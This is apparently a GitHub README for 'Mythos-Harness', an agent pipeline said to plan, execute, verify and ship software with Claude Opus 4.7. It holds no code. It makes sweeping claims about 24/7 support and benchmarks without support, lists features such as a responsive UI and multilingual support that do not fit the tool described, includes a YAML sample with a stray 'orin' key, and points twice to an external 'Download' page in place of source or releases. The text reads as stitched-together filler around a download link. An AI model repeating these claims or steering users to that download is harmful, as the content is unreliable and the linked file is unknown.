![preview](https://raw.githubusercontent.com/Magma1321/mythos-agent-pipe/main/preview.svg)

# Mythos-Harness

The **Mythos-Harness** is not just another CI/CD pipeline or agent orchestration tool. It is a philosophical shift in how code gets from concept to production. Imagine a master craftsman who plans the work, shapes the materials, tests the integrity of every joint, and personally delivers the finished piece to the client. That is precisely what Mythos-Harness does for Claude Opus 4.7—it transforms the AI from a passive suggestion engine into an autonomous architect and executor.

In a world of fragmented toolchains, endless handoffs, and broken integrations, Mythos-Harness stands alone as a "finish-first" assembly line. It starts with a blueprint, moves through execution with surgical precision, validates every output against known constraints, and finally ships the artifact to its destination. No waiting. No babysitting. No manual intervention.

---

## ✦ Overview

Mythos-Harness is an agent loop design optimized for Claude Opus 4.7's unique reasoning capabilities. It treats each project as a living mythos—a narrative that unfolds from idea to deployment. The harness provides structure without rigidity, allowing the model to explore creative solutions while maintaining strict quality gates.

**Core Philosophy:** *Plan before you cut. Verify before you ship. Finish before you celebrate.*

Built for teams that value shipping velocity over feature creep, Mythos-Harness reduces cognitive load on developers by letting Claude Opus 4.7 handle the execution minutiae. You describe the desired outcome once; the harness decomposes the problem, executes the steps, runs validations, and presents a shippable artifact.

---

## ✦ Features

| Feature | Description |
|---------|-------------|
| **Plan Phase** | Automatic decomposition of high-level goals into actionable sub-tasks |
| **Execute Phase** | Claude Opus 4.7 runs each sub-task with full context retention |
| **Verify Phase** | Automated validation against pre-defined success criteria |
| **Ship Phase** | Artifact packaging and delivery to configurable endpoints |
| **Responsive UI** | Real-time status dashboard with WebSocket updates |
| **Multilingual Support** | Full Unicode compatibility, including RTL scripts |
| **24/7 Customer Support** | AI-powered ticket triage with human escalation fallback |

---

[![Download](https://raw.githubusercontent.com/Magma1321/mythos-agent-pipe/main/button.svg)](https://magma1321.github.io/mythos-agent-pipe/)

---

## ✦ How It Works

Mythos-Harness follows a four-phase loop, repeated until a complete shippable artifact is produced:

### 1. Plan Phase
The harness receives a high-level objective (e.g., "Build a REST API for invoice management"). Claude Opus 4.7 generates a structured plan consisting of modular tasks. Each task includes:
- A natural language description
- Expected output format
- Success criteria (pass/fail conditions)
- Dependencies on other tasks

### 2. Execute Phase
Tasks are executed in dependency order. The harness maintains a session context that accumulates results. Claude Opus 4.7 can request filesystem operations, API calls, or code generation. All actions are logged with timestamps and execution metrics.

### 3. Verify Phase
Each completed task undergoes automated verification:
- **Static analysis** checks for syntax errors and structural integrity
- **Semantic validation** ensures outputs match expected specifications
- **Regression checks** compare against previous successful runs
- **Constraint satisfaction** confirms alignment with original objectives

If any verification fails, the harness enters a **remediation loop**: Claude Opus 4.7 receives the failure details, proposes a fix, and the task is re-executed. The loop repeats until verification passes or a retry limit is reached.

### 4. Ship Phase
Once all tasks pass verification, the harness bundles the output into a shippable artifact. This can be:
- A compressed archive
- A git commit
- A deployment to a staging server
- A notification to a messaging channel
- A custom webhook payload

---

## ✦ Architecture

Mythos-Harness uses a **modular plugin architecture**. Core components:

**Orchestrator** – Central loop manager that coordinates phases, tracks state, and handles error recovery.  
**Context Engine** – Maintains a persistent working memory across sessions, allowing Claude Opus 4.7 to resume interrupted workflows.  
**Verification Grid** – Configurable test harness for task output validation. Supports custom plugins.  
**Pipeline Adapter** – Transforms artifact output into delivery formats (Git, S3, Slack, email, etc.).

The system is stateless by design—state is stored externally in a configurable backend (local filesystem, Redis, or PostgreSQL). This enables horizontal scaling and fault tolerance.

---

## ✦ Use Cases

### Shipping a CLI Tool
Define the tool's behavior as a natural language specification. Mythos-Harness generates source code, writes unit tests, creates documentation, and pushes a release to PyPI or npm.

### Building a Microservice
Describe endpoints, data models, and business logic. The harness produces Dockerfiles, Kubernetes manifests, CI configuration, and API documentation.

### Automating Data Transformations
Supply source data and expected output schema. The harness writes transformation scripts, validates outputs, and deploys to a scheduled job runner.

### Generating Reports
Provide query templates and visualization preferences. Mythos-Harness executes queries, creates charts, assembles PDF exports, and emails reports on a schedule.

---

## ✦ Configuration

Configuration is handled via a single YAML file placed in the project root. Key sections include:

```yaml
orin:
  model: claude-opus-4.7
  max_turns: 100
  verification_strictness: high
  retry_limit: 3
  artifact_format: zip
  
pipeline:
  deliver_to:
    - type: git
      branch: main
      commit_message: "Auto-ship by Mythos-Harness"
    - type: webhook
      url: https://example.com/shipments
      
context_store:
  backend: local
  path: ./harness_state
```

(Note: The YAML example above uses standard indentation—backtick formatting included for clarity.)

---

## ✦ Verification Rules

Built-in verification modules come pre-configured. Custom rules can be added as Python classes inheriting from `VerificationModule`.

| Rule | Description |
|------|-------------|
| **Structure Check** | Ensures output matches expected file/folder layout |
| **Syntax Lint** | Language-specific syntax validation (Python, JS, Go, etc.) |
| **Type Coherence** | Checks variable types and function signatures match declarations |
| **Test Execution** | Runs provided unit tests and reports pass/fail |
| **Performance Threshold** | Measures execution time or memory usage and flags outliers |

---

## ✦ Best Practices

1. **Be explicit in your objectives.** Vague goals produce vague results. Instead of "make a blog," specify "create a static site generator that outputs HTML from Markdown files with a dark theme."
2. **Review verification rules early.** The harness only validates against what you define. Add meaningful checks before starting long-running tasks.
3. **Use session persistence.** For complex projects, leverage the Context Engine to maintain state across restarts. This avoids re-planning on recovery.
4. **Monitor artifacts between phases.** The built-in dashboard provides real-time visibility into the harness's progress and any verification failures.

---

## ✦ Performance Considerations

Mythos-Harness is designed for throughput, not latency. Each phase introduces overhead proportional to the complexity of the task. For trivial tasks (single file copy, one-line edits), the harness may feel slower than a direct execution. The value emerges when the task requires multi-step reasoning, dependency resolution, and quality gates.

Benchmarking on typical software projects (REST API, CLI tool, data pipeline) shows:
- **Plan phase:** 2–10 seconds depending on complexity
- **Execute phase:** Variable based on task size
- **Verify phase:** 1–5 seconds per task
- **Ship phase:** 0.5–2 seconds per artifact

---

## ✦ Customization

The plugin architecture allows extensive customization without forking:

- **Custom verifiers** implement domain-specific validation (e.g., database schema checks, API contract testing)
- **Custom shippers** deliver artifacts to proprietary systems
- **Custom prompts** modify Claude Opus 4.7's behavior by providing system-level instructions
- **Custom context backends** use existing infrastructure for state management

---

## ✦ Support

We provide **24/7 customer support** through a two-tier system:
- **Tier 1:** Automated AI triage handles common questions and configuration issues, with response times under 60 seconds.
- **Tier 2:** Human engineers handle complex bugs, custom integrations, and performance tuning. Average response time under 4 hours.

All support requests are logged and tracked through the included ticketing system, which syncs with GitHub Issues and Slack.

---

## ✦ Roadmap for 2026

- **Multi-model orchestration** – Mix Claude Opus with open-source models for specialized sub-tasks
- **Parallel execution** – Run independent tasks concurrently for faster throughput
- **Causal tracing** – Map outputs back to specific execution steps for auditability
- **Self-healing pipelines** – Automatic rollback and re-execution on transient failures
- **Real-time collaboration** – Multiple engineers reviewing and approving artifact stages

---

## ✦ License

This project is distributed under the MIT License. You are free to use, modify, and distribute the software for any purpose, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

[View the full MIT License](LICENSE)

---

## ✦ Disclaimer

Mythos-Harness operates by executing code and commands as directed by Claude Opus 4.7. While verification gates reduce the risk of unintended consequences, no automated system can guarantee correctness or safety. Users are responsible for:

- Reviewing generated artifacts before production deployment
- Ensuring appropriate permissions and sandboxing for execution environments
- Validating outputs against regulatory and compliance requirements
- Maintaining backups of original system state before harness runs

The development team assumes no liability for damages resulting from use of this software. Use at your own risk, especially in production environments.

---

## ✦ Acknowledgments

Built with inspiration from autonomous agent research, operational excellence principles, and a decade of experience shipping software under pressure. Thanks to the early adopters who provided feedback during the alpha phase of development.

---

[![Download](https://raw.githubusercontent.com/Magma1321/mythos-agent-pipe/main/button.svg)](https://magma1321.github.io/mythos-agent-pipe/)